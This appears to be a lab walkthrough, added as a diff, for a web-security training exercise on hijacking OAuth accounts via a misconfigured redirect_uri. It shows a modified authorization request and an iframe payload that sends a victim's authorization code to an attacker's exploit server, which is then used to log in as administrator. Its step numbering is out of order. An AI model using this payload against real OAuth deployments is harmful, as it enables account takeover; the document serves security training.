@@ -1,0 +1,225 @@
+# Lab: OAuth Account Hijacking via redirect_uri
+
+
+This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
+
+To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.
+
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
+
+You can log in with your own social media account using the following credentials: wiener:peter.
+
+
+
+
+
+// solution:
+
+
+## Step 1
+
+Open the lab.
+
+---
+
+## Step 2
+
+Click **My Account**.
+
+---
+
+## Step 3
+
+Login using **OAuth (Social Login)** with:
+
+```
+Username: wiener
+Password: peter
+```
+
+---
+
+## Step 4
+
+After login, you will return to the blog website.
+
+---
+
+## Step 5
+
+Click **Log out**.
+
+---
+
+## Step 6
+
+Click **My Account** again and choose **Log in with Social Media**.
+
+Since your OAuth session is still active, you will be logged in instantly.
+
+---
+
+## Step 7
+
+Go to **Burp → HTTP History**.
+
+Find the latest request:
+
+```
+GET /auth?client_id=LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
+```
+
+This is the OAuth authorization request.
+
+---
+
+## Step 8
+
+Right-click this request.
+
+Select:
+
+```
+Send to Repeater
+```
+
+---
+
+## Step 9
+
+In Repeater, find the parameter:
+
+```
+redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback
+```
+
+---
+
+## Step 10
+
+Replace it with your **Exploit Server URL**.
+
+Example:
+
+```
+redirect_uri=https://YOUR-EXPLOIT-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email
+```
+
+Leave all other parameters unchanged.
+
+---
+
+## Step 11
+
+Click **Send**.
+
+---
+
+## Step 12
+
+Click or copy **Follow Redirect** in the response and open in new tab.
+
+The OAuth server will now redirect to your exploit server.
+
+
+---
+
+## Step 13
+
+Go to **Exploit Server → Body**.
+
+Create this payload:
+
+```html
+<iframe src="https://oauth-LAB-ID.oauth-server.net/auth?client_id=LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+```
+Now Store → View Exploit → Deliver to Victim.
+
+---
+
+---
+
+## Step 14
+
+Click **View Exploit**.
+
+The iframe should load successfully.
+
+---
+
+## Step 15
+
+Go back to **Access Log**.
+
+You should see another request containing a `code=` parameter.
+
+This confirms the exploit works.
+
+---
+
+## Step 16
+
+Click **Deliver exploit to victim**.
+
+---
+
+## Step 17
+
+After a few seconds, open **Access Log** again.
+
+Copy the victim's authorization code.
+
+Example:
+
+```
+code=GWSK52e_tlexi6TVCp0w9yBfOoW-NDNQRdNNxJkfWKr
+```
+
+---
+
+## Step 18
+
+Log out of the blog website.
+
+---
+
+## Step 21
+
+Open this URL in your browser:
+
+```
+https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=VICTIM_CODE
+```
+
+Replace `VICTIM_CODE` with the code you copied.
+
+---
+
+## Step 19
+
+The OAuth flow completes automatically.
+
+You are now logged in as the **Administrator**.
+
+---
+
+## Step 20
+
+Open the **Admin Panel**.
+
+---
+
+## Step 21
+
+Delete the user:
+
+```
+carlos
+```
+
+---
+
+## Step 22
+
+The lab is solved. ✅
+
